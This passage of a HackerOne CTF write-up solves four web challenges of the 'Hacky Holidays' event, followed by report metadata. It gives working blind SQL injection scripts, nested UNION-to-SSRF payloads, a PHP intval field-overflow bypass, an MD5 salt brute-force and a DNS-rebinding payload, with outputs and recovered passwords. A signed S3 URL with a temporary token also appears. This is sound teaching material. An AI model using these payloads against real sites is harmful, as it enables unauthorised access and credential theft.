cookie.txt\n```\nOutput:\n`\u003cdiv class=\"well well-sm\" style=\"margin:0;font-size:12px\"\u003eWe've launched our recon server, gathered intelligence and pin pointed Santa's location!\u003cbr\u003eNot long now until we find the IP addresses of his workshop and we can launch the DDoS attack!!!\u003cbr\u003e\u003cbr\u003e\u003cstrong\u003eflag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}\u003c/strong\u003e\u003c/div\u003e`\n\n\n# Flag 9 -- /evil-quiz\n### Basic functionality\nhttps://hackyholidays.h1ctf.com/evil-quiz is an interactive system where you enter your name and take a quiz. The final result page gives you:\n - an evil score\n - a count of other players who share your name\n\nThis site keeps track of your name and score server-side and uses a client-side `session` cookie.\n### Hack\nThe `Your Name` field on the first page has a SQL injection vulnerability. However, the vulnerable query is only executed on the final the page that shows your score/similarly named player count. This prevents tools such as sqlmap from identifying this.\n\nThis is exploitable using a time/SLEEP based blind SQLi. We can exploit this faster by taking advantage of the \"similarly named player count\" field. The name `test` returns many users with the same name on the final result page, while the name `invalidName654321` will not return any additional users. We can craft a SQLi exploit that takes advantage of this, returning `test` when a query is `true` and `invalidName654321` when a query is `false`. This technique is called `Boolean Based Blind SQL Injection`.\n\nPython script to print admin password:\n```\nimport requests\n\n# note that using this technique I have already determined that the data I'm looking for is in the 'admin' table within this database under the columns 'username'/'password'\n# this script is similar to one used here in a real vulnerability -- https://hackerone.com/reports/982202\n\n# WARNING: grab a fresh session cookie before running\ncookie = \"832b58a541df03e22d9d8b432035040b\"\n\ndef test(inject, cookie):\n    headers = {'Cookie': 'session=' + cookie}\n    data = {'name': \"invalidName654321' or name=(SELECT IF(\" +inject + \",'test','invalidName654321')) AND 'quote'='quote\"}\n\n    # first stage, send name in with blind SQLi payload\n    r = requests.post('https://hackyholidays.h1ctf.com/evil-quiz', headers=headers, data=data, timeout=10)\n\n    # second stage, trigger blind SQLi with the \"get score\" request\n    r = requests.get('https://hackyholidays.h1ctf.com/evil-quiz/score', headers=headers, timeout=10)\n    if \"There is 0 other player\" in r.text:\n        return False\n    else:\n        return True\n\n\noffsetId = 0\nwhile True:\n    prefix = \"\"\n\n    while True:\n        hit = False\n\n        for i in range(32,127):\n            # \"BINARY\" is required here to get case-sensitive output\n            dataInput= \"BINARY '\" + str(prefix+chr(i)) + \"'=(select SUBSTRING(password,1,\" + str(len(prefix)+1) + \") from admin LIMIT \" + str(offsetId) + \", 1)\"\n\n            if test(dataInput, cookie):\n                print(\"HIT \" + chr(i))\n                prefix = prefix + chr(i)\n                hit = True\n                break\n\n        if hit == False:\n            print(\"all done -- \" + prefix)\n            break\n\n    offsetId = offsetId + 1\n\n```\nOutput (after a few minutes):\n```\nHIT S\nHIT 3\nHIT c\nHIT r\nHIT e\nHIT T\nHIT _\nHIT p\nHIT 4\nHIT s\nHIT s\nHIT w\nHIT 0\nHIT r\nHIT d\nHIT -\nHIT $\nall done -- S3creT_p4ssw0rd-$\n```\n\nLogging in reveals the flag:\n```\ncurl -X POST https://hackyholidays.h1ctf.com/evil-quiz/admin --data 'username=admin\u0026password=S3creT_p4ssw0rd-%24' 2\u003e/dev/null | grep flag\n```\nOutput:\n```\n\u003ch3 class=\"text-center\"\u003eflag{6e8a2df4-5b14-400f-a85a-08a260b59135}\u003c/h3\u003e\n```\n\n\n# Flag 10 -- /signup-manager\n### Basic functionality\nhttps://hackyholidays.h1ctf.com/signup-manager/ allows a user to register and log in. Once logged in, the user is prompted with: `We'll have a look into you and see if you're evil enough to join the grinch army!`\n### Hack\nUsing dirsearch, we can spot a few interesting files:\n```\n# python3 dirsearch.py -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,http://sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,.log,.xml,.js.,.json -u https://hackyholidays.h1ctf.com/signup-manager/\n\n _|. _ _  _  _  _ _|_    \n(_||| _) (/_(_|| (_| )\n\nExtensions: conf, config, bak, backup, swp, old, db, sql, asp, aspx, aspx~, asp~, py, py~, rb, rb~, php, php~, bkp, cache, cgi, csv, html, inc, jar, js, json, jsp, jsp~, lock, log, rar, sql.gz, http://sql.zip, sql.tar.gz, sql~, swp~, tar, tar.bz2, tar.gz, txt, wadl, zip, .log, .xml, .js., .json | HTTP method: get | Threads: 10 | Wordlist size: 23721\n\nTarget: https://hackyholidays.h1ctf.com/signup-manager/\n\n[04:45:28] Starting:\n[04:45:38] 200 -   36B  - /signup-manager/admin.php\n[04:46:24] 200 -   15KB - /signup-manager/index.php\n[04:46:36] 200 -  712B  - /signup-manager/README.md\n[04:46:46] 200 -   36B  - /signup-manager/user.php\n\nTask Completed\n```\n\nLooking at https://hackyholidays.h1ctf.com/signup-manager/README.md we can read the install instructions for this website. This points to a zip file:\nhttps://hackyholidays.h1ctf.com/signup-manager/signupmanager.zip\n\nReading the source code inside this zip (`index.php` in particular), we learn that this site stores all users in a single text file. Each field has a specified length, appended with `#` chars if the data provided is too short:\n```\n            $users[$username] = array(\n                'username' =\u003e $username,\n                'password' =\u003e str_replace('#', '', substr($user_str, 15, 32)),\n                'cookie' =\u003e str_replace('#', '', substr($user_str, 47, 32)),\n                'age' =\u003e intval(str_replace('#', '', substr($user_str, 79, 3))),\n                'firstname' =\u003e str_replace('#', '', substr($user_str, 82, 15)),\n                'lastname' =\u003e str_replace('#', '', substr($user_str, 97, 15)),\n                'admin' =\u003e ((substr($user_str, 112, 1) === 'Y') ? true : false)\n```\n\nWe want to create an account with `admin=Y` in order to find the flag. In order to do that we must find a bypass that allows us to send through a field with data that is too long for the space provided. This can be accomplished using the `age` field. On signup the `age` field interacts with the following PHP code:\n```\n            if (!is_numeric($_POST[\"age\"])) {\n                $errors[] = 'Age entered is invalid';\n            }\n            if (strlen($_POST[\"age\"]) \u003e 3) {\n                $errors[] = 'Age entered is too long';\n            }\n            $age = intval($_POST[\"age\"]);\n```\n\n`intval` is dangerous because other non-integer values are accepted which could overflow the 3 chars used for the `age` field. In particular using the math notation `1e3` will cause this field to use 4 chars (PHP: `int(1000)=intval(\"1e3\")`) and shift the string allowing us to overwrite the admin char with `Y` using the `lastname` field (set to `YYYYYYYYYYYYYYY`).\n\nFinal signup bypass:\n```\ncurl -X POST https://hackyholidays.h1ctf.com/signup-manager/ --data \"action=signup\u0026username=$(openssl rand -hex 4)\u0026password=password\u0026age=1e3\u0026firstname=test\u0026lastname=YYYYYYYYYYYYYYY\" --cookie cookie.txt --cookie-jar cookie.txt 2\u003e/dev/null \u003e /dev/null\ncurl https://hackyholidays.h1ctf.com/signup-manager/ --cookie cookie.txt --cookie-jar cookie.txt 2\u003e/dev/null | grep -A 1 flag\nrm cookie.txt\n```\n\nOutput:\n```\n\u003cp class=\"text-center\"\u003eflag{99309f0f-1752-44a5-af1e-a03e4150757d}\u003c/p\u003e\n\u003cp class=\"text-center\"\u003eYou made it through, continue to your next task \u003ca href=\"/r3c0n_server_4fdk59\"\u003ehere\u003c/a\u003e\u003c/p\u003e\n```\n\n# Flag 11 -- /r3c0n_server_4fdk59\n### Basic functionality\nhttps://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/ is a photo album viewing service. There is a link to an attack-box with a username/password field.\nThe page mentions \"We are currently developing an API, apologies for anything that doesn't work quite right\". Visiting `api/` we can see a list of API status codes:\nhttps://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/api/ \n```\nHTTP Status Code Explanation\n\n200 Successful request with data returned\n\n204 Successful request but with no data found\n\n404 Invalid Endpoint\n\n400 Invalid GET/POST variable\n\n401 Unauthenticated Request or Invalid client IP\n```\nAttempting to access any API endpoint results in an error message:\nhttps://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/api/test\n`{\"error\":\"This endpoint cannot be visited from this IP address\"}`\n\n### Hack\nImages are loaded using base64 encoded JSON, for example:\nhttps://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLzliODgxYWY4YjMyZmYwN2Y2ZGFhZGE5NWZmNzBkYzNhLmpwZyIsImF1dGgiOiJlOTM0ZjQ0MDdhOWRmOWZkMjcyY2RiOWMzOTdmNjczZiJ9\nThis uses the JSON:\n`{\"image\":\"r3c0n_server_4fdk59\\/uploads\\/9b881af8b32ff07f6daada95ff70dc3a.jpg\",\"auth\":\"e934f4407a9df9fd272cdb9c397f673f\"}`\n\n**Objective**\nWe want to use the `image` path to access the `api/` endpoints. We cannot edit the JSON directly as the `auth` hash would be incorrect. We also cannot guess accurate `auth` hashes.\n\n**Vulnerability**\nThe only vulnerability is a read-only SQLi here:\nhttps://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k\n\nSqlmap picks this up:\n```\n# python3 sqlmap.py -u https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k\n...\nsqlmap identified the following injection point(s) with a total of 47 HTTP(s) requests:\n---\nParameter: hash (GET)\n    Type: boolean-based blind\n    Title: AND boolean-based blind - WHERE or HAVING clause\n    Payload: hash=jdh34k' AND 5370=5370 AND 'iWZY'='iWZY\n\n    Type: UNION query\n    Title: Generic UNION query (NULL) - 3 columns\n    Payload: hash=-4955' UNION ALL SELECT NULL,NULL,CONCAT(0x71786a6271,0x584f6849685a57534759426b6f6a786945666b646147476e745856655a656c41776a46495a6a6a63,0x71716b6a71)-- -\n---\n\n# python3 sqlmap.py -u https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k --dump\n...\nDatabase: recon\nTable: photo\n[6 entries]\n+----+----------+--------------------------------------+\n| id | album_id | photo                                |\n+----+----------+--------------------------------------+\n| 1  | 1        | 0a382c6177b04386e1a45ceeaa812e4e.jpg |\n| 2  | 1        | 1254314b8292b8f790862d63fa5dce8f.jpg |\n| 3  | 2        | 32febb19572b12435a6a390c08e8d3da.jpg |\n| 4  | 3        | db507bdb186d33a719eb045603020cec.jpg |\n| 5  | 3        | 9b881af8b32ff07f6daada95ff70dc3a.jpg |\n| 6  | 3        | 13d74554c30e1069714a5a9edda8c94d.jpg |\n+----+----------+--------------------------------------+\n...\nDatabase: recon\nTable: album\n[3 entries]\n+----+--------+-----------+\n| id | hash   | name      |\n+----+--------+-----------+\n| 1  | 3dir42 | Xmas 2018 |\n| 2  | 59grop | Xmas 2019 |\n| 3  | jdh34k | Xmas 2020 |\n+----+--------+-----------+\n```\n**Stage 1 -- first SQLi**\nWe cannot use this SQLi to change the content of the database. We can however use the `UNION` spotted by sqlmap to append a row to the query output.\n\nPayload: `INVALID' UNION ALL SELECT \"1\",\"unused\",\"unused album title\"-- -`\nOne row of data returned by query: `\"1\",\"unused\",\"unused album\"`\nURL: \nhttps://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=INVALID%27%20UNION%20ALL%20SELECT%20%221%22,%22unused%22,%22unused%20album%20title%22--%20-\nNote that the page returns two images corresponding to album id `1`. This implies the `1` we are returning from this query is being fed into another query.\n\n**Stage 2 -- second SQLi**\nAttempting to exploit this manually, we suspect the query will look something like:\n`select id, album_id, photo from photo where album_id='\u003cinjection point\u003e'`\n\nWith that in mind we can build a similar `UNION` based exploit within the first query to append another row, generating a valid, signed base64 URL.\nNew payload: `' union all select 99,'test','abc'-- -`\nAdded to previous payload: `INVALID' UNION ALL SELECT \"' union all select 99,'test','abc'-- -\",\"unused\",\"unused album title\"-- -`\nURL: https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=INVALID%27%20UNION%20ALL%20SELECT%20%22%27%20union%20all%20select%2099,%27test%27,%27abc%27--%20-%22,%22unused%22,%22unused%20album%20title%22--%20-\nThis generated an image link:\nhttps://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcL2FiYyIsImF1dGgiOiIxOTM5YzkzNjRmMWU3MjBmNDE3NzMyMzkxZDRmNjJjZiJ9\n`{\"image\":\"r3c0n_server_4fdk59\\/uploads\\/abc\",\"auth\":\"1939c9364f1e720f417732391d4f62cf\"}`\nNote the `abc` is what we provided above in our second stage payload. Visiting that URL, we see this URL does not exist:\n`Expected HTTP status 200, Received: 404`\n\n**Stage 3 -- API discovery using SSRF**\nUsing a script nearly identical to the one below (for guessing the password), the endpoints `../api/ping` and `../api/user` are both valid.\n`../api/ping`:\nalbum: https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=INVALID%27%20UNION%20ALL%20SELECT%20%22%27%20union%20all%20select%2099,%27test%27,%27../api/ping%27--%20-%22,%22unused%22,%22unused%20album%20title%22--%20-\nimage: https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL3BpbmciLCJhdXRoIjoiOTMzZTJkMzk5NWE4MmIzZmQyODE1NWQyMjg3MDk1M2YifQ==\nResponse: \n`Invalid content type detected`\n\n`../api/user`:\nalbum: https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=INVALID%27%20UNION%20ALL%20SELECT%20%22%27%20union%20all%20select%2099,%27test%27,%27../api/user%27--%20-%22,%22unused%22,%22unused%20album%20title%22--%20-\nimage: https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL3VzZXIiLCJhdXRoIjoiYmZiNmRkMDRlNjZlODU1NjRkZWJiYTNlN2IyMjJlMzQifQ==\nResponse:\n`Invalid content type detected`\n\n`Invalid content type detected` likely means that we received data here, but not a valid image.\n\n**Stage 4 -- additional API discovery using SSRF**\nWe detect that `../api/user` has parameters by providing an invalid one:\n`../api/user?abc=xyz` -\u003e `Expected HTTP status 200, Received: 400`\n\nAbove, in the API description, a 400 response was described as \"400 Invalid GET/POST variable\".\n\nUsing a script nearly identical to the one below (for guessing the password), we can spot only two exceptions are `username` and `password`:\n`../api/user?username=xyz` -\u003e `Expected HTTP status 200, Received: 204`\n`../api/user?password=xyz` -\u003e `Expected HTTP status 200, Received: 204`\n\nAbove, in the API description, a 204 response was described as \"204 Successful request but with no data found\"\n\n**Stage 5 -- Final wildcard SQLi**\nThe username/password are guessable using a SQL wildcard character. Using `%25` (URL encoded `%`) we can derive the correct username and password! For example:\n`../api/user?username=xyz` -\u003e `Expected HTTP status 200, Received: 204`\n`../api/user?username=%25` -\u003e `Invalid content type detected`\n`../api/user?username=a%25` -\u003e `Expected HTTP status 200, Received: 204`\n`../api/user?username=g%25` -\u003e `Invalid content type detected`\n(reference https://data-flair.training/blogs/sql-wildcard/ )\n\nUsing this technique we can guess the username is `grinchadmin`. Here is a script to derive the password (a similar script was used on all previous steps):\n```\nimport requests\nimport re\n\nprefix = \"\"\n\nwhile True:\n\n    for i in [*range(48, 57), *range(97, 122)]:\n        s = chr(i)\n        s = prefix + s + '%25'\n\n        # initial multi-stage SQLi\n        r = requests.get('https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=INVALID\\' UNION ALL SELECT \"\\' union all select 99,\\'test\\',\\'../api/user?username=grinchadmin%26password='+s+'\\'-- -\",\"unused\",\"unused album title\"-- -')\n\n        # trigger SSRF\n        if \"img-responsive\" in r.text:\n            result = re.search('\u003cimg class=\"img-responsive\" src=\"(.*)\"\u003e', r.text)\n            r = requests.get('https://hackyholidays.h1ctf.com'+result.group(1))\n\n            if \"Invalid content type detected\" in r.text:\n                print(\"hit:\" +prefix + chr(i))\n                prefix = prefix + chr(i)\n                break\n```\nOutput:\n```\nhit:s\nhit:s4\nhit:s4n\nhit:s4nt\nhit:s4nt4\nhit:s4nt4s\nhit:s4nt4su\nhit:s4nt4suc\nhit:s4nt4suck\nhit:s4nt4sucks\n```\n\n**Conclusion** \nAttempting to visualize each stage listed above in our final payload:\n```\n1111111111111111111111111112222222222222222222222222222223333333333334444444445555555555544444444444455555555552222211111111111111111111111111111111111\nINVALID' UNION ALL SELECT \"' union all select 99,'test','../api/user?username=grinchadmin%26password=s4nt4sucks'-- -\",\"unused\",\"unused album title\"-- -\n```\nUsing `grinchadmin:s4nt4sucks` we can log in to /attack-box and reveal the flag:\n```\ncurl -X POST https://hackyholidays.h1ctf.com/attack-box/login --data \"username=grinchadmin\u0026password=s4nt4sucks\" --cookie cookie.txt --cookie-jar cookie.txt 2\u003e/dev/null \u003e /dev/null\ncurl https://hackyholidays.h1ctf.com/attack-box/ --cookie cookie.txt --cookie-jar cookie.txt 2\u003e/dev/null | grep flag\nrm cookie.txt\n```\nOutput:\n`\u003ch4 class=\"text-center\"\u003eflag{07a03135-9778-4dee-a83c-7ec330728e72}\u003c/h4\u003e`\n# Flag 12 -- /attack-box\n### Basic functionality\nhttps://hackyholidays.h1ctf.com/attack-box is the \"Grinch Network Attack Server\" used to target Santa's servers. It can be used to launch attacks against the listed IP addresses.\n\nThe website shows the output of launching an attack against an IP address:\n```\ngrinch@attackbox:~/tools$ ./ddos --load ba8bf2feeb3b8e5279678e1adc0bcde2.target\n\nSetting Target Information  \nGetting Host Information for: 203.0.113.33  \nSpinning up botnet  \nLaunching attack against: 203.0.113.33 / 203.0.113.33  \nping 203.0.113.33  \n64 bytes from 203.0.113.33: icmp_seq=1 ttl=118 time=15.3 ms  \n64 bytes from 203.0.113.33: icmp_seq=2 ttl=118 time=17.6 ms  \n64 bytes from 203.0.113.33: icmp_seq=3 ttl=118 time=21.7 ms  \nHost still up, maybe try again?  \n```\n\n### Hack\nOur objective is to change the target IP to `localhost` or `127.0.0.1` in order to cause the Grinch to launch an attack on himself!\n\n**Stage 1 -- hash computation**\nAttacking an IP address, we are provided a link:\nhttps://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==\nThe base64 payload is:\n`{\"target\":\"203.0.113.33\",\"hash\":\"5f2940d65ca4140cc18d0878bc398955\"}`\n\nIf we try and change `target`, we must also change `hash`. In order to figure out how `hash` is computed, we can brute-force the prefix/salt that is used when forming this MD5 hash:\n```\nimport hashlib\n\nwith open('rockyou.txt',encoding='utf8',errors='replace') as f:\n    for line in f:\n        h = line.strip() + \"203.0.113.33\"\n        output = hashlib.md5(h.encode('utf-8')).hexdigest()\n        if output == \"5f2940d65ca4140cc18d0878bc398955\":\n            print(\"HIT: \"+line.strip())\n```\n(word list: https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt)\n(obviously https://hashcat.net/hashcat/ would be faster here :) )\n\nOutput:\n`HIT: mrgrinch463`\n\nTherefore every hash must be:\n`MD5(\"mrgrinch463\" + $target) = $hash`\n\n**Stage 2 -- localhost bypass**\nAttempting to provide `127.0.0.1` as a target here results in the following output:\nhttps://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIxMjcuMC4wLjEiLCJoYXNoIjoiM2UzZjhkZjE2NTgzNzJlZGYwMjE0ZTIwMmFjYjQ2MGIifQ==\n```\ngrinch@attackbox:~/tools$ ./ddos --load 3390c49ed47433d38ca2d10b582ac93d.target\n\nSetting Target Information  \nGetting Host Information for: 127.0.0.1  \nLocal target detected, aborting attack\n```\n\nAttempting to launch valid attack at `www.example.com`, this script appears to attempt to resolve the DNS value for the target multiple times:\nhttps://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiJ3d3cuZXhhbXBsZS5jb20iLCJoYXNoIjoiMDVhYmQyNjM5ZTM4NWZkMzcwYmMyYWY5NDU1OGQwZjAifQ==\n\n```\n...\nGetting Host Information for: www.example.com \u003c-- initial DNS request  \nHost resolves to 93.184.216.34  \nSpinning up botnet  \nLaunching attack against: www.example.com / 93.184.216.34 \u003c-- second DNS request \n...\n```\n\nTherefore an DNS rebinding attack appears to be possible! If we can do the following we can get the Grinch to attack himself:\n1) return a non-internal IP response from the DNS server for the first request\n2) return 127.0.0.1 from the DNS server for the second request\n\n**Conclusion**\nUsing the following DNS rebinding service we can execute this attack:\nhttps://lock.cmpxchg8b.com/rebinder.html \n\nFinal payload:\n`{\"target\":\"01020304.7f000001.rbndr.us\",\"hash\":\"69c31cdcfad3ef1deb652f4aca52d2cc\"}`\nURL: \nhttps://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIwMTAyMDMwNC43ZjAwMDAwMS5yYm5kci51cyIsImhhc2giOiI2OWMzMWNkY2ZhZDNlZjFkZWI2NTJmNGFjYTUyZDJjYyJ9\nResponse:\n```\n[\n  {\n    \"id\": \"25225\",\n    \"content\": \"Setting Target Information\",\n    \"goto\": false\n  },\n  {\n    \"id\": \"25226\",\n    \"content\": \"Getting Host Information for: 01020304.7f000001.rbndr.us\",\n    \"goto\": false\n  },\n  {\n    \"id\": \"25227\",\n    \"content\": \"Host resolves to 1.2.3.4\",\n    \"goto\": false\n  },\n  {\n    \"id\": \"25228\",\n    \"content\": \"Spinning up botnet\",\n    \"goto\": false\n  },\n  {\n    \"id\": \"25229\",\n    \"content\": \"Launching attack against: 01020304.7f000001.rbndr.us / 127.0.0.1\",\n    \"goto\": false\n  },\n  {\n    \"id\": \"25230\",\n    \"content\": \"No Response from attack server, retrying...\",\n    \"goto\": false\n  },\n  {\n    \"id\": \"25231\",\n    \"content\": \"No Response from attack server, retrying...\",\n    \"goto\": false\n  },\n  {\n    \"id\": \"25232\",\n    \"content\": \"No Response from attack server, retrying...\",\n    \"goto\": \"/attack-box/challenge-completed-a3c589ba2709\"\n  }\n]\n```\nThis forwards us to the final page / flag:\nhttps://hackyholidays.h1ctf.com/attack-box/challenge-completed-a3c589ba2709\n`flag{ba6586b0-e482-41e6-9a68-caf9941b48a0}`\n\n{F1130976}","automated_response":false,"created_at":"2020-12-27T00:33:42.898Z","updated_at":"2020-12-27T00:33:42.898Z","actor":{"username":"erbbysam","cleared":true,"url":"/erbbysam","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":1130976,"filename":"final.PNG","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/wa1vv793v2vqqv5i8e1wp6wl2eg5?response-content-disposition=attachment%3B%20filename%3D%22final.PNG%22%3B%20filename%2A%3DUTF-8%27%27final.PNG\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ4NIHB2M2%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132107Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJGMEQCIE3FUcgRK7FM%2F7U9PAkh6%2BI7wZViD1MP1Y8qZWLRN1eUAiAgc4SQu0yGJV%2BOQRn82JsTD2%2Bd2fHZQycxL60pz%2B7CjyqDBAjt%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMkR9JAvrXeOfq9Rc6KtcDp5bGOpV6FTgydp%2FZOb6Bh6HFPtwnCVZfa015OiSuBfCxPwur%2F7aSPKTNE0sy0w9C45qL0zZ1nOQQos0M24uDH67J2wRZXM50ImEA29W1ENYnCggW3Oj1ThbKF4WgRsg%2F9mjcm%2BZmkVxvLoYJ9V%2BPAToGVUPNdCuARshEYKICR0Xo5x6JoDNaCt8Ld9eGqOBMXV3rned7uAPh8EmsbYJGE3kgeYkoAT36Qaqe4UgPgyO9VFwa9aDWRX%2B50CKWSjbjZzr%2BF%2B9jH4MB%2FxFZ4EWRHEor6ZAw08vWfwqAZLqqZdMNm9vuS82Y9DrOKW2mwiXSVAN3ddQvsOMXsKnTXkUhnfuaQmZvTtYFFm%2BIF8eMq92q4rbYHzak7PfNtWyYQ5raA9JIgznaWFJzJX%2BJlzu%2Bu3r2q3jjPLUM80AxozLcRqWVvYBpiIJlFx45cKPkX%2F2%2BeKoncWc%2B6ePWFPme30ZUDKqp6naa4cEDN31MhQC6Orokr1YD%2FJvOnl4SUarbB1%2BVgfPNBbXbzGIn%2BQ51fempHBLdSWygAxQb8EgPDJYVXZxvBJySlPreu1xMH98Dq97W1%2FcRuSdU1ytWMJPT5MEKol3iFlX9S3vBhB4zpCiL0Qjhs8rBVdayMKLXkIsGOqYB2%2BJTBbMxNO8iefRZNNANeiPRoGrUFs7jVSy6MeL55bB1oEjsBrS1ldm2HFxpIsKxeGY%2Fw5R4r6d07DNpzBAlMx0mvj%2FrMVfwHZDUaLkkIW7L5kfZJyauAUQfU1Yr9%2Flzl1bTl9jiK08pDtPhZS7%2FjLscylmOg0jy%2BlazgeqN9hRW54AGkI6XkZty9qqJMe%2BYbSVGEfkYqEbJxp7dv5pFW%2Ftu9oswsQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=2a31a4a2598b80acbbcfea8dd54be12c5735174bec8746c64ae506006f681157"}],"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10268958,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"#","automated_response":false,"created_at":"2021-01-04T22:31:56.840Z","updated_at":"2021-01-04T22:31:56.840Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":10269003,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello!\n\nHappy new year and congratulations on being one of the first 10 hackers to solve the 12 Days of Hacky Holidays! If you'd like to receive a HackerOne care package, please email your full name, address, email address and phone number to █████@hackerone.com \n\nThanks,\nBen","automated_response":false,"created_at":"2021-01-04T22:34:36.687Z","updated_at":"2021-01-11T21:22:54.612Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":10299645,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","automated_response":false,"created_at":"2021-01-07T21:34:48.567Z","updated_at":"2021-01-07T21:34:48.567Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"reporter":{"username":"erbbysam","url":"/erbbysam"},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":10334185,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2021-01-11T22:19:40.886Z","updated_at":"2021-01-11T22:19:40.886Z","first_to_agree":true,"actor":{"username":"erbbysam","cleared":true,"url":"/erbbysam","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10334233,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2021-01-11T22:24:38.705Z","updated_at":"2021-01-11T22:24:38.705Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":10334234,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2021-01-11T22:24:38.779Z","updated_at":"2021-01-11T22:24:38.779Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}